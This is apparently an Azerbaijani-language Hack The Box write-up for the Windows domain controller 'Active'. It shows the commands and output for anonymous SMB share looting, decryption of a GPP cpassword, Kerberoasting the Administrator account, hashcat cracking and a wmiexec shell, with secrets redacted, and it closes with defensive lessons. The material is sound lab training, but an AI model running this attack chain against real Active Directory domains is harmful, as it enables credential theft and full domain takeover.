# Active (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text

Kəşfiyyat

├── nmap -p- --min-rate=5000 -T4 -Pn -n active.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001, +high RPC ports

├── nmap -sC -sV → Microsoft DNS 6.1.7601, Domain: active.htb, Host: DC, OS: Windows Server 2008 R2 SP1

└── /etc/hosts: 10.129.84.160 active.htb dc.active.htb

İlkin Giriş (Anonim SMB -> GPP cpassword)

├── smbclient -L //10.129.84.160/ -N → anonymous login successful

├── Share Replication readable anonymously (SYSVOL replica)

├── smbclient //.../Replication -N -c 'recurse ON; mget *' → Groups.xml

├── Groups.xml: cpassword="<GPP_CPASSWORD>"

└── gpp-decrypt → SVC_TGS:<PASSWORD>

Autentifikasiyalı Sadalanma

├── smbclient -L //10.129.84.160/ -U 'SVC_TGS%<PASSWORD>' → Users, SYSVOL, Replication readable

├── smbclient //.../Users -c 'get user.txt' → <USER_FLAG>

└── GetUserSPNs.py -request → SPN active/CIFS:445 on Administrator → tgs.hash

Səlahiyyətlərin Artırılması (Kerberoasting -> Domain Admin)

├── hashcat -m 13100 tgs.hash rockyou.txt → Administrator:<PASSWORD>

└── wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160 → shell

    └── type C:\Users\Administrator\Desktop\root.txt → <ROOT_FLAG>

```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Windows Server 2008 R2 SP1 Domain Controller (`DC`) üçün `active.htb` domeni. Port profili (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 9389 AD Web Services) - Active Directory-nin klassik imzasıdır. SMB signing aktiv və məcburidir - SMB relay mümkün deyil.

İki çox yayılmış AD konfiqurasiya xətası bu maşını zəif edir: SYSVOL replikasına (`Replication` payı) anonim SMB girişi, hansı ki Group Policy Preferences kredlərini saxlayır, və yüksək imtiyazlı hesabın (`Administrator`) Service Principal Name ilə konfiqurasiya edilməsi - bu Kerberoasting-i mümkün edir.

---

## Kəşfiyyat

### Port Scan

Sürət üçün `--min-rate=5000` ilə tam TCP skanı, sonra tapılan portlara fokuslanmış servis skanı:

```bash

mkdir -p \~/Desktop/active/scans; cd \~/Desktop/active/scans

nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n active.htb -oA scans/quick

nmap -sC -sV -Pn -n --open -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 active.htb -oA scans/detail

```

**Nəticə (detail):**

```

PORT      STATE SERVICE       VERSION

53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: ...)

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp   open  tcpwrapped

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped

5722/tcp  open  msrpc         Microsoft Windows RPC

9389/tcp  open  mc-nmf        .NET Message Framing

47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49152/tcp open  msrpc         Microsoft Windows RPC

...

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:

| smb2-security-mode:

|   2.1:

|_    Message signing enabled and required

```

Portların xülasəsi:

| Port  | Servis        | Qeydlər                                   |

|-------|---------------|-------------------------------------------|

| 53    | DNS           | Microsoft DNS 6.1.7601                    |

| 88    | Kerberos      | Windows Kerberos                          |

| 135   | MSRPC         | Windows RPC                               |

| 139   | NetBIOS-SSN   | Legacy SMB                                |

| 389   | LDAP          | Domain: active.htb                        |

| 445   | SMB           | Signing enabled and required              |

| 464   | kpasswd5      | Kerberos password change                  |

| 593   | RPC over HTTP | ncacn_http                                |

| 636   | LDAPS         | tcpwrapped                                |

| 3268  | GC-LDAP       | Global Catalog LDAP                       |

| 3269  | GC-LDAPS      | tcpwrapped                                |

| 5722  | DFSR RPC      | Distributed File System Replication       |

| 9389  | AD Web Svcs   | .NET Message Framing                      |

| 47001 | HTTP          | Microsoft HTTPAPI                         |

Hostu `/etc/hosts`-a əlavə edirik:

```bash

echo "10.129.84.160    active.htb dc.active.htb" | sudo tee -a /etc/hosts

```

**Əsas müşahidə:** `dns-nsid` `Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)` göstərir, LDAP `active.htb` domenini bildirir. Bu legacy DC-dir (2008 R2) - GPP tipli konfiqurasiya xətaları, yalnız RC4 Kerberos və müasir mitiqasiyaların olmaması gözlənilir.

---

## İlkin Giriş (Anonim SMB -> GPP cpassword)

DC-də anonim SMB icazə verilir:

```bash

smbclient -L //10.129.84.160/ -N

```

**Nəticə:**

```

Anonymous login successful

        Sharename       Type      Comment

        ---------       ----      -------

        ADMIN$          Disk      Remote Admin

        C$              Disk      Default share

        IPC$            IPC       Remote IPC

        NETLOGON        Disk      Logon server share

        Replication     Disk

        SYSVOL          Disk      Logon server share

        Users           Disk

```

`Replication` payı diqqəti çəkir. Domain Controller-də `Replication` - SYSVOL-un DFS-R replikasıdır (Group Policy məlumatlarını saxlayır). SYSVOL dizayn olaraq bütün autentifikasiyalı istifadəçilərə açıqdır - lakin anonim giriş konfiqurasiya xətasıdır.

Bütün payı rekursiv yükləyirik:

```bash

mkdir -p \~/Desktop/active/Replication; cd \~/Desktop/active/Replication

smbclient //10.129.84.160/Replication -N -c 'recurse ON; prompt OFF; mget *'

```

**Nəticə:**

```

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI ...

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI ...

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol ...

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml ...

...

```

Group Policy Preferences faylını tapırıq:

```bash

find \~/Desktop/active/Replication -iname 'Groups.xml'

```

**Nəticə:**

```

/home/kali/Desktop/active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

```

Faylı oxuyuruq:

```bash

cat "$(find \~/Desktop/active/Replication -iname 'Groups.xml' | head -1)"

```

**Nəticə:**

```xml

<?xml version="1.0" encoding="utf-8"?>

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">

    <Properties action="U" newName="" fullName="" description="" cpassword="<GPP_CPASSWORD>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>

  </User>

</Groups>

```

`cpassword` atributu şifrələnmiş paroldur. Microsoft GPP tərəfindən istifadə olunan AES-256 açarını 2012-ci ildə yayımladı (MSDN [MS-GPPREF] 2.2.1.1.4), buna görə şifrə açma trivialdır:

```bash

gpp-decrypt '<GPP_CPASSWORD>'

```

**Nəticə:**

```

<PASSWORD>

```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Kredlər əldə edildi: `active.htb\SVC_TGS : <PASSWORD>`.

---

## Autentifikasiyalı Sadalanma

Alınan kredlərlə girişi yoxlayırıq:

```bash

smbclient -L //10.129.84.160/ -U 'active.htb\SVC_TGS%<PASSWORD>'

```

**Nəticə:** `Users`, `SYSVOL`, və `Replication` açıqdır. `ADMIN$`, `C$`, `IPC$` non-admin hesab üçün əlçatan deyil.

İstifadəçi bayrağı `Users` payındadır:

```bash

smbclient //10.129.84.160/Users -U 'active.htb\SVC_TGS%<PASSWORD>' -c 'cd "SVC_TGS\Desktop"; ls; get user.txt'

cat user.txt

```

**Nəticə:**

```

<USER_FLAG>

```

Sonra Service Principal Name-i olan hesabları sadalayırıq - onlar Kerberoastable-dır. Impacket `GetUserSPNs.py` `SVC_TGS` kimi autentifikasiya olur və gördüyü hər SPN üçün TGS-REP biletini tələb edir:

```bash

GetUserSPNs.py active.htb/SVC_TGS:<PASSWORD> -dc-ip 10.129.84.160 -request -outputfile \~/Desktop/active/tgs.hash

```

**Nəticə:**

```

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation

--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------

active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 23:06:40.351723  ...

```

**Əsas müşahidə:** `Administrator` hesabının özünün SPN-i var (`active/CIFS:445`). `Administrator` Domain Admin olduğu üçün TGS-REP bileti Domain Admin hesabının NTLM heşi ilə şifrələnib - onu qırmaq tam domen nəzarəti verir.

Heş `\~/Desktop/active/tgs.hash`-a yazıldı:

```bash

ls -l \~/Desktop/active/tgs.hash

wc -c \~/Desktop/active/tgs.hash

```

---

## İstismar

No CVE (custom vulnerability) - Group Policy Preferences `cpassword` dəyərini Microsoft-un yayımladığı statik AES-256 açarı ilə şifrələnmiş formada saxlayır (MSDN [MS-GPPREF] 2.2.1.1.4, 2012); SYSVOL dizayn olaraq bütün autentifikasiyalı istifadəçilərə açıqdır. SYSVOL replikasına anonim oxu girişi şifrələnmiş parolu autentifikasiya olunmamış hücumçuya açdı.

No CVE (design weakness) - Kerberoasting legit Kerberos TGS-REQ / TGS-REP axınından sui-istifadə edir; hər hansı autentifikasiyalı istifadəçi hər hansı SPN üçün service ticket tələb edə və onu offline qıra bilər, çünki bilet servis hesabının NTLM heşi ilə şifrələnir. Protokolda zəiflik yoxdur - yalnız zəif, lüğət əsaslı servis hesabı parolu.

---

## Səlahiyyətlərin Artırılması (Kerberoasting -> Domain Admin)

TGS-REP heşini qırırıq. Format `$krb5tgs$23$...` (etype 23, RC4-HMAC), bu hashcat rejimi `13100`-ə uyğundur:

```bash

hashcat -m 13100 \~/Desktop/active/tgs.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable

```

**Nəticə:**

```

hashcat (v7.1.2) starting

...

$krb5tgs$23$*Administrator$ACTIVE.HTB$...:<PASSWORD>

...

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...651dcc

Time.Started.....: ... (5 secs)

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 10543104/14344385 (73.50%)

```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Kredlər əldə edildi: `active.htb\Administrator : <PASSWORD>`.

Hesab Domain Admin-dir. Impacket `wmiexec.py` WMI/SMB üzərindən yarıinteraktiv shell verir:

```bash

wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160

```

**Nəticə:**

```

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv2.1 dialect used

[!] Launching semi-interactive shell - Careful what you execute

[!] Press help for extra shell commands

C:\>whoami

active\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt

<ROOT_FLAG>

```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər                            |

|--------|----------------------------------|

| User   | <USER_FLAG> |

| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **Domain Controller-də anonim SMB kritik konfiqurasiya xətasıdır.** `Replication` payı SYSVOL-un tam replikasını autentifikasiya olunmamış istifadəçilərə açdı. SYSVOL dizayn olaraq autentifikasiyalı istifadəçilərə açıqdır, lakin heç vaxt anonim deyil.

- **Group Policy Preferences (GPP) `cpassword` faktiki olaraq açıq mətndir.** Microsoft AES-256 açarını 2012-də yayımladı (MSDN [MS-GPPREF] 2.2.1.1.4) və MS14-025-də yeni GPP yerləşdirmələrini bağladı, lakin yamaq SYSVOL-dan mövcud `cpassword` dəyərlərini silmir. Heç vaxt GPP-də kred saxlama.

- **SPN-i yüksək imtiyazlı hesablara bağlamayın.** Burada `Administrator` özünün SPN-i var idi (`active/CIFS:445`). Hər hansı autentifikasiyalı istifadəçi (o cümlədən aşağı imtiyazlı `SVC_TGS`) onun TGS-REP-ini tələb edə və offline qıra bilərdi - dərhal Domain Admin girişi.

- **Kerberoasting dizayn zəifliyidir, zəiflik deyil.** Müdafiə - uzun, təsadüfi yaradılmış servis hesabı parolları (və ya avtomatik rotasiyalı gMSA), protokolu yamaqlamaq deyil. Qeyri-adi TGS-REQ həcmini izləyin (Event ID 4769 RC4 şifrələmə ilə).

- **RC4 (etype 23) Kerberoasting-i sürətli edir.** 2026-da Microsoft RC4 əsaslı Kerberoasting-i rəsmi olaraq CVE-2026-20833 ilə əlaqələndirdi (Kerberos information disclosure, CVSS 5.5) və Domain Controllers-də RC4-ü defolt olaraq söndürməyə başladı (iyul 2026-dan enforcement). Bu walkthrough-da `active.htb` domeni hücum anında hələ də RC4 istifadə edirdi.

- **SMB signing aktiv və məcburi** SMB relay-in qarşısını aldı - maşın bir sinif hücumdan qorunmuşdu, digərlərinə qarşı zəif qalırdı.

- **Çoxqatlı xəta:** aşağı imtiyazlı servis hesabının (`SVC_TGS`) bir sızmış parolu kifayət etdi, çünki AD-nin defolt icazə modeli hər hansı autentifikasiyalı istifadəçiyə hər hansı SPN üçün service ticket tələb etməyə icazə verir və domendə ən imtiyazlı hesab Kerberoastable idi.

